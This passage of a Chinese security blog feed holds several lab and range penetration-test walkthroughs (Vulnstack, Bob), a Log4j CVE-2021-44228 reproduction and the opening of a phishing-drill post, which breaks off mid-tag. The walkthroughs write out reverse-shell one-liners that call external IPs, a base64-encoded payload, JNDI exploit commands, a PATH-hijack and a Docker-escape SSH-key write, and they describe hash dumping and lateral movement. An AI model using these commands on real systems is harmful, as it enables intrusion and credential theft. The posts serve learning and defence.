    <content type="html"><![CDATA[<p>Fscan快速进行信息收集<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250121151757629.png" alt="image.png"><br>利用工具一键getshell<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250121151825346.png" alt="image.png"><br>蚁剑连接<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250121151726676.png" alt="image.png"><br>发现是linux系统，linux一般没什么杀软<br>可以用这个命令检测一下<code>dpkg -l | grep -i antivirus</code><br>的确没有，那我们可以大胆点执行命令<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250121152203513.png" alt="image.png"><br>权限比较低是www-data<br>确定内网ip<br>172.22.1.15<br>怕把机子打崩了，先不看内核提权，这里看看有没有机制滥用<br>suid跟sudo<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250121152431910.png" alt="image.png"><br>可以看到mysql可以nopassword提权到root<br><a href="https://gtfobins.github.io/gtfobins/mysql/">https://gtfobins.github.io/gtfobins/mysql/</a><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250121152741426.png" alt="image.png"><br>ok，没有问题<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250121152935320.png" alt="image.png"><br>得到第一个flag<br>flag{60b53231-<br>做代理，这里我先试试suo5<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250121153538651.png" alt="image.png"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250121153555217.png" alt="image.png"><br>没有问题<br>我们把fscan传上去<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250121154635725.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250121154651270.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250121154814273.png" alt="image.png"><br>把报告复制下来丢到工具分析一下<br>可以看到除了本机15还有三台主机开着，而且除了本机是Linux，其它的都是Windows<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250121154930776.png" alt="image.png"><br>其中21被检测出存在ms17-010，2是域控<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250121155015333.png" alt="image.png"><br>18有个信呼OA的办公系统，先看看信呼OA<br>当然在此之前上线个CS<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250121161106350.png" alt="image.png"><br>制作马的过程参考网上的crossc2教程<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250121161150638.png" alt="image.png"><br>唯一需要注意的是只能在443端口上线，所以监听器要设置在https，主要是为了方便我们一会儿转发上线，也不需要执行什么特别的操作，这里就执行下whoami<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250121161349472.png" alt="image.png"><br>ok，开始对信呼OA进行测试<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250121182532828.png" alt="1737447417490.png"><br>看到版本是2.2.8<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250121182557143.png" alt="1737447448158.png"></p><p>弱口令admin&#x2F;admin123进入后台<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250121182610928.png" alt="1737447536150.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250121182616855.png" alt="1737448150472.png"><br>这里可以上传一个1.php，配合<br><a href="https://blog.csdn.net/solitudi/article/details/118675321">https://blog.csdn.net/solitudi/article/details/118675321</a><br>即可，上传不重要，只要在脚本同目录放一个1.php，写上木马即可<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250121182625888.png" alt="1737448212930.png"><br>注意要用蚁剑链接的话，刚才的php代码要改成REQUEST，这样子才能即验证成功，又能直接连接<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250121182629864.png"><br>这里不知道为什么一直没办法执行代理转发上线的beacon，后续再研究下<br>（后面发现发现有阿里云盾开着，一有异常就杀了）<img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250121182713046.png" alt="1737449207923.png">先找到flag02.txt<br>2ce3-4813-87d4-<br>提示说下一步就是打域控<br>打21的永恒之蓝<br>永恒之蓝打一次之后很容易失效，如果打不成功就重置一下环境<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250122111146666.png" alt="image.png"><br>抓一下哈希<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250122111342956.png" alt="image.png"><br>但还不是域管的，继续抓<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250122111836886.png" alt="image.png"><br>看到administrator的hash，横呗<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250122112104853.png" alt="image.png"><br>成功，找flag<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250122112211424.png" alt="image.png"><br>完成<br>e8f88d0d43d6}</p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>打靶</tag>
      
      <tag>内网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红日五</title>
    <link href="/2025/01/29/%E7%BA%A2%E6%97%A55/"/>
    <url>/2025/01/29/%E7%BA%A2%E6%97%A55/</url>
    
    <content type="html"><![CDATA[<p>TP 框架直接用工具getshell<br>传马，信息收集<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250121212458757.png" alt="image.png"><br>内网网段192.168.138.1&#x2F;24<br>域名sun.com<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250121212810871.png" alt="image.png"><br>得到域控ip 138<br>然后再做下主机探测，看看C段下还有多少主机<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250121213535428.png" alt="image.png"><br>只receive两台，我还以为是不准，换了fscan<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250121213557866.png" alt="image.png"><br>发现真就两台，而且开启了smb,139，<br>先抓取下凭证<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250121213958899.png" alt="image.png"><br>得到域管NTLM Hash跟明文密码，直接试试横向<br>先弄个代理，这里suo5就行了，简单方便<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250121214927545.png" alt="image.png"><br>横成功了<br>换一种再横一次<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250121222203702.png" alt="image.png"><br>pth横向<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250121222242633.png" alt="image.png"><br>然后用刚才方法触发一下1.exe即可<br>其实就是为了在CS练下权限维持<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250121224247878.png" alt="image.png"><br>拿到域SID及krbtgt的NTLM hash<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250121224347700.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250121224606690.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250121224641064.png" alt="image.png"><br>从而实现对域控的访问<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250121224734450.png" alt="image.png"><br>可以将文件传到域控上</p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>打靶</tag>
      
      <tag>内网</tag>
      
      <tag>红日/vulnstack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红日七</title>
    <link href="/2025/01/29/%E7%BA%A2%E6%97%A57/"/>
    <url>/2025/01/29/%E7%BA%A2%E6%97%A57/</url>
    
    <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241228193913516.png" alt="image.png"><br>端口扫描，80跟22都没什么思路，于是爆破6379<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241228193945830.png" alt="image.png"><br>发现存在匿名访问<br>redis未授权可以写webshell，也可以直接写ssh密钥进行连接，又或者是计划任务</p><h1 id="REDIS未授权写ssh-key"><a href="#REDIS未授权写ssh-key" class="headerlink" title="REDIS未授权写ssh_key"></a>REDIS未授权写ssh_key</h1><p>我们这里直接写ssh<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241228194032634.png" alt="image.png"><br>先生成一个密钥<br>然后写入key.txt<br><code>(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt</code><br>然后上工具传<br><code>.\RedisEXP_windows_amd64.exe -m ssh -r 10.10.0.108 -p 6379 -u root -s</code><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250122163221243.png" alt="image.png"><br>这里不知道为什么Linux机子连不上ssh，我把id_rsa传到windows上一下就连上了<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250122163057037.png" alt="image.png"><br>没事，不影响操作，看到了内网ip是192.168.52.10，上fscan扫扫看<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250122163530661.png" alt="image.png"><br>ping的通，说明还是出网的<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250122163814205.png" alt="image.png"><br>fscan这么看有点乱，画个拓扑<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250122165125602.png" alt="image.png"><br>要么就打通达，要么打laravel，我选择先打通达，无他，洞多</p><h1 id="通达一把梭"><a href="#通达一把梭" class="headerlink" title="通达一把梭"></a>通达一把梭</h1><p>搞个代理再说，这里传了个venom<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250122173345137.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250122173705067.png" alt="image.png"><br>梭梭梭<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250122173754739.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250122173815208.png" alt="image.png"><br>直接就是system权限<br>socks5:&#x2F;&#x2F;193.134.210.161:1080<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250125151913361.png" alt="image.png"><br>上传一个vshell的正向连接木马，并进行连接，再做一波信息收集<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250125153500662.png" alt="image.png"><br>看到域名whoamianony.org，而且还有又一张网卡192.168.93.20<br>mimikatz抓一下密码<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250125152538296.png" alt="image.png"><br>得到域管hash跟明文密码，这下好办了<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250125152756579.png" alt="image.png"><br>但是看到还有两个域，不管了，先扫，我的想法是先尽可能收集到更多的信息，再考虑去横<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250125154146549.png" alt="image.png"><br>再画一下拓扑<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250125155502213.png" alt="image.png"><br>初步是这么画，我认为93.10很可能和52.20也是同一台机子，所以画在了一起<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250125155610780.png" alt="image.png"><br>30，40都存在ms17-010<br>优先肯定是打30，拿下DC，40基本也就拿下了<br>而且我们前面已经抓到了域管hash，也扫出来139，445什么都是开着的，还用想，impacket打一波先</p><h1 id="横向DC"><a href="#横向DC" class="headerlink" title="横向DC"></a>横向DC</h1><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250125161128878.png" alt="image.png"><br>成功拿下域管</p><h1 id="永恒之蓝"><a href="#永恒之蓝" class="headerlink" title="永恒之蓝"></a>永恒之蓝</h1><p>与此同时，40也被永恒之蓝拿下了<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250125161255634.png"></p><h1 id="另一条路"><a href="#另一条路" class="headerlink" title="另一条路"></a>另一条路</h1><p>到此为止，就剩下两台Linux没有消息，我们就打离的比较近的192.168.52.20<br>根据fscan给到的提示，我们打poc-yaml-laravel-cve-2021-3129<br><a href="https://github.com/ajisai-babu/CVE-2021-3129-exp">https://github.com/ajisai-babu/CVE-2021-3129-exp</a><br>这个好用<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250125163154580.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250125163212580.png" alt="image.png"><br>直接拿下了<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250125163411334.png" alt="image.png"><br>但是打着感觉怪怪的，什么命令都没有，正常来说都会自带点的，我就想这是不是docker容器，要做逃逸，我们去看看目录<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250125163530473.png" alt="image.png"><br>看到.dockerenv，基本docker无疑了<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250125163626018.png" alt="image.png"><br>这是docker容器的id，其实我还不是很懂怎么docker逃逸，我只能抄抄作业，后续再学习下<br>到最开始的机器上nc一下，反弹shell<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250125165028939.png" alt="image.png"><br><code>bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/192.168.52.10/6666 &lt;&amp;1&#39;</code><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250125165102844.png" alt="image.png"><br>找提权<img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250125165239329.png" alt="image.png">这里因为vshell不是很稳定，学了手像finalshell这些工具可以直接导入id_rsa去连，非常稳定<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250125165633655.png" alt="image.png"><br>看不懂这个shell写的啥<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250125165813580.png" alt="image.png"><br>接下来的操作叫做<strong>变量劫持</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /tmp<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash&quot;</span> &gt; ps<br><span class="hljs-built_in">chmod</span> 777 ps<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span><br><span class="hljs-built_in">cd</span> /home/jobs<br>./shell<br><br>python -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250125170023615.png" alt="image.png"><br>拿到了root权限，虽然是docker的root权限，我们还是没逃逸出去<br>然后就是</p><h2 id="docker特权逃逸"><a href="#docker特权逃逸" class="headerlink" title="docker特权逃逸"></a>docker特权逃逸</h2><p>fdisk -l<br>mkdir f<br>mount  &#x2F;dev&#x2F;sda1 f<br>ls f<br><code>echo &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDEh6LeoFa0pIAZyEuYewpvoajtuLE/CUzqMQVgnyUlzQYscnQeAJBJr4IbIR+3M1WNg5qf02hbx/Jcq5lGsZI4iB/QJO5v/Y/8FH3SiHO0zzMp3KAATRTW+n4VIMiHXqMg671ORh4Dcit/uHl6glg0rjhuyhclqraj7DZaCFxabkxRPcEqRASsit28ARpX7MNne2wWPHRHRbV4G2F6i3W0w7Lvd7ubTusjsPztwyxHw3A2jnN94YEvT8TLRfECqrZFApn76nNbutU/qLMnM8kdvaLkyi4EPXcIopvXu5eFoZStJvym4rJ8N8NEgyr6aYaHOyBIB9/QbBQS0hfkUE63 root@ubuntu&#39; &gt; f/home/ubuntu/.ssh/authorized_keys</code><br>这是网上答案的做法，但我试了下，既然可以写到&#x2F;home&#x2F;ubuntu&#x2F;.ssh，那我为什么不直接写道&#x2F;root&#x2F;.ssh<br>我的做法是</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs swift">fdisk <span class="hljs-operator">-</span>l<br>mkdir f<br>mount  <span class="hljs-regexp">/dev/</span>sda1 f<br>mkdir f<span class="hljs-regexp">/root/</span>.ssh<br>echo &#x27;ssh<span class="hljs-operator">-</span>rsa <span class="hljs-type">AAAAB3NzaC1yc2EAAAADAQABAAABAQDEh6LeoFa0pIAZyEuYewpvoajtuLE</span><span class="hljs-regexp">/CUzqMQVgnyUlzQYscnQeAJBJr4IbIR+3M1WNg5qf02hbx/</span><span class="hljs-type">Jcq5lGsZI4iB</span><span class="hljs-regexp">/QJO5v/</span><span class="hljs-type">Y</span><span class="hljs-regexp">/8FH3SiHO0zzMp3KAATRTW+n4VIMiHXqMg671ORh4Dcit/</span>uHl6glg0rjhuyhclqraj7DZaCFxabkxRPcEqRASsit28ARpX7MNne2wWPHRHRbV4G2F6i3W0w7Lvd7ubTusjsPztwyxHw3A2jnN94YEvT8TLRfECqrZFApn76nNbutU<span class="hljs-regexp">/qLMnM8kdvaLkyi4EPXcIopvXu5eFoZStJvym4rJ8N8NEgyr6aYaHOyBIB9/</span><span class="hljs-type">QbBQS0hfkUE63</span> root<span class="hljs-meta">@ubuntu</span>&#x27; <span class="hljs-operator">&gt;</span> f<span class="hljs-regexp">/root/</span>.ssh<span class="hljs-operator">/</span>authorized_keys<br></code></pre></td></tr></table></figure><p>然后直接连<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250125174741773.png" alt="image.png"><br>没有任何问题，还跳过了提权的过程</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>至此，内网五台机子全部拿下<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250125174901215.png" alt="image.png"><br>我们再用xmind整理一波思路<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250125181702701.png" alt="image.png"></p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>打靶</tag>
      
      <tag>内网</tag>
      
      <tag>红日/vulnstack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BOB</title>
    <link href="/2025/01/01/Bob/"/>
    <url>/2025/01/01/Bob/</url>
    
    <content type="html"><![CDATA[<p>靶机ip：192.168.149.134</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>首先使用rustscan对靶标进行快速的全端口扫描<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241223112316196.png" alt="image.png"><br>可以看到开了21，80，25468端口，再用nmap做一个详细的信息收集<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241223112512627.png" alt="image.png"><br>可以看到80端口的http服务有一些敏感目录的泄漏</p><h1 id="外围打点"><a href="#外围打点" class="headerlink" title="外围打点"></a>外围打点</h1><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241223113045127.png" alt="image.png"><br>我们访问dev-shell.php发现可以执行系统命令（图上已执行whoami）<br>我们试着去反弹shell<br>先在攻击机上用nc进行监听<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241223113503425.png" alt="image.png"></p><p>&#x2F;bin&#x2F;nc 172.29.61.154 7777 -e &#x2F;bin&#x2F;bash<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241223113425855.png"><br>成功反弹<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241223113522739.png" alt="image.png"><br>这样的窗口不稳定，我们做信息收集看看有没有python服务做pty<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241223113616976.png" alt="image.png"><br>可以看到目标机器上有python3.5跟2.7<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241223113722038.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241223114002699.png" alt="image.png"><br>根目录看到flag.txt，但是显然权限不足，那我们接下来就做提权</p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>老规矩，先看有没有内核<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241223114306648.png" alt="image.png"><br>先把提权脚本传到目标机上<br>没有看到好用的内核提权漏洞<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241223114545611.png" alt="image.png"><br>看到gpg文件，这里很可能可以提权，主要是要找到密钥<br>其中嫌疑最大的应该是&#x2F;home&#x2F;bob&#x2F;Documents&#x2F;login.txt.gpg，那我们自然也想到到那里看看有没有敏感文件<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241223114828539.png" alt="image.png"><br>有个secret目录<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241223115020974.png" alt="image.png"><br>一路进去看到这个文件猜测这个就是跟密码有关的文件，他们的首字母都是大写，猜测就是密码<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241223115246548.png" alt="image.png"><br>但是发现权限不够，返回home目录看到还有几个用户，猜测www-data权限太低了，可能要先提权到这些用户里<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241223115559410.png" alt="image.png"><br>这时候再仔细看看，发现Bob的home目录下有隐藏的文件，其中应该是他们的账号密码，这里我们采用ssh连接试试<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241223115815835.png" alt="image.png"><br>成功连接，再重复刚才的操作即可<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241223115911515.png" alt="image.png"><br>gpg –batch –passphrase HARPOCRATES -d login.txt.gpg<br>看到Bob的密码，那我们再ssh直接连就行<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241223120147690.png" alt="image.png"><br>完成</p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2021-44228</title>
    <link href="/2025/01/01/CVE-2021-44228/"/>
    <url>/2025/01/01/CVE-2021-44228/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞名"><a href="#漏洞名" class="headerlink" title="漏洞名"></a>漏洞名</h1><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a><font color="#32CD32"><u>0x01 简介</u></font></h2><p>Apache Log4j是一个基于Java的日志记录组件，通过重写Log4j引入了丰富的功能特性，该日志组件被广泛应用于业务系统开发，用以记录程序输入输出日志信息。Apache Log4j2存在远程代码执行漏洞，攻击者可利用该漏洞向目标服务器发送精心构造的恶意数据，触发Log4j2组件解析缺陷，实现目标服务器的任意代码执行，获得目标服务器权限。</p><h2 id="0x02-漏洞概述"><a href="#0x02-漏洞概述" class="headerlink" title="0x02 漏洞概述"></a><font color="#32CD32"><u>0x02 漏洞概述</u></font></h2><p><strong>漏洞编号：CVE-2021-44228</strong></p><h2 id="0x03-影响版本"><a href="#0x03-影响版本" class="headerlink" title="0x03 影响版本"></a><font color="#32CD32"><u>0x03 影响版本</u></font></h2><p>Apache Log4j 2.x &lt;&#x3D; 2.14.1<br>可能的受影响应用包括但不限于如下：<br>Spring-Boot-strater-log4j2<br>Apache Struts2<br>Apache Solr左边第三个选项，rename<br>Apache Flink<br>Apache Druid 一个最上面的框，一个左边第三个选项中添加的框<br>ElasticSearch<br>flume<br>dubbo<br>Redis<br>logstash<br>kafka</p><h2 id="0x04-环境搭建"><a href="#0x04-环境搭建" class="headerlink" title="0x04 环境搭建"></a><font color="#32CD32"><u>0x04 环境搭建</u></font></h2><h2 id="0x05-漏洞复现"><a href="#0x05-漏洞复现" class="headerlink" title="0x05 漏洞复现"></a><font color="#32CD32"><u>0x05 漏洞复现</u></font></h2><p>探测是否存在：<code>$&#123;jndi:ldap://123.3m1so0.ceye.io&#125;</code>(get时需要URL编码)<br>或者<code>logger.info(&quot;$&#123;jndi:ldap://123.3m1so0.ceye.io&#125;&quot;</code><br>或者<code>logger.error(&quot;$&#123;jndi:ldap://3m1so0.ceye.io&#125;&quot;)</code><br>error级别的更容易触发，如果不打印info级别信息，则info级别不能触发漏洞。所以优先用error触发。<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241230123010249.png" alt="image.png"><br>获取java版本：<code>$&#123;jndi:ldap://$&#123;sys:java.version&#125;.3m1so0.ceye.io&#125;</code><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241230123315664.png" alt="image.png"><br>getshell<br>现在服务器开个监听端口<br>nc -lvnp 4444<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241230130257806.png" alt="image.png"><br>这是反弹shell指令，要进行base64加密，bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;8.138.103.120&#x2F;4444 0&gt;&amp;1<br>YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzOC4xMDMuMTIwLzQ0NDQgMD4mMQo&#x3D;<br>最后通过jndi开服务<br>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C “bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzOC4xMDMuMTIwLzQ0NDQgMD4mMQo&#x3D;}|{base64,-d}|{bash,-i}” -A “8.138.103.120”<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241230130439296.png" alt="image.png"><br>这里我选择1.8的ldap<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241230130753657.png" alt="image.png"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241230130600751.png" alt="image.png"><br>有一次就行了，我这里不小心发多了两次<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241230130628666.png" alt="image.png"></p><h2 id="0x06-修复方式"><a href="#0x06-修复方式" class="headerlink" title="0x06 修复方式"></a><font color="#32CD32"><u>0x06 修复方式</u></font></h2><p>最直接、有效、稳定的修复方式是：将 log4j-core 升级到 2.15.0 版本<br>缓解方式1：接入安全产品<br>缓解方式2：删除漏洞类<br><code>zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class</code><br>缓解方式3：通过配置禁用 log4j 的 lookup 功能</p><ol><li>设置日志输出 Pattern 格式</li><li>设置JVM系统属性</li><li>修改配置文件</li><li>设置进程环境变量</li></ol><p>缓解方式4：升级JDK版本<br>JDK 11.0.1、8u191、7u201、6u211</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a><font color="#32CD32"><u>参考链接</u></font></h2><p>靶场链接：<br><a href="https://yunjing.ichunqiu.com/cve/detail/755?pay=1">春秋云镜</a><br><a href="https://vulhub.org/#/environments/log4j/CVE-2021-44228/">vulhub</a><br>打法：<br><a href="https://www.cnblogs.com/forforever/p/15703000.html">https://www.cnblogs.com/forforever/p/15703000.html</a><br>修复方案：<br><a href="https://zhuanlan.zhihu.com/p/448218255">https://zhuanlan.zhihu.com/p/448218255</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞</tag>
      
      <tag>CVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次钓鱼演练</title>
    <link href="/2025/01/01/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%92%93%E9%B1%BC%E6%BC%94%E7%BB%83/"/>
    <url>/2025/01/01/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%92%93%E9%B1%BC%E6%BC%94%E7%BB%83/</url>
    
    <content type="html"><![CDATA[<h1 id="记一次钓鱼演练"><a href="#记一次钓鱼演练" class="headerlink" title="记一次钓鱼演练"></a>记一次钓鱼演练</h1><p>注：本文只用于学习与交流，请不要在未授权的情况下做任何对计算机有危害的操作，一切后果作者不承担</p><p>钓鱼演练，首先要准备的肯定是一个免杀的木马<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225101643811.png" alt="image.png"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225101808137.png" alt="image.png"><br>火绒跟windows defender都是没问题的，过不了360，但是无伤大雅，因为我事先看了一下， 没人用360</p><p>因为只是测试，这个木马的shellcode只是弹个计算器，不会有别的危害<br>至于源码就不发了，相信各位大佬肯定都是随便免杀的，这里就不丢脸了</p><p>钓鱼直接发个exe肯定没人信，接下来就是钓鱼的伪装，首先我们做Lnk伪造<br>第一步，新建文件夹<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225103407047.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225103458516.png" alt="image.png"><br>在文件夹里新建一个快捷方式<br><img 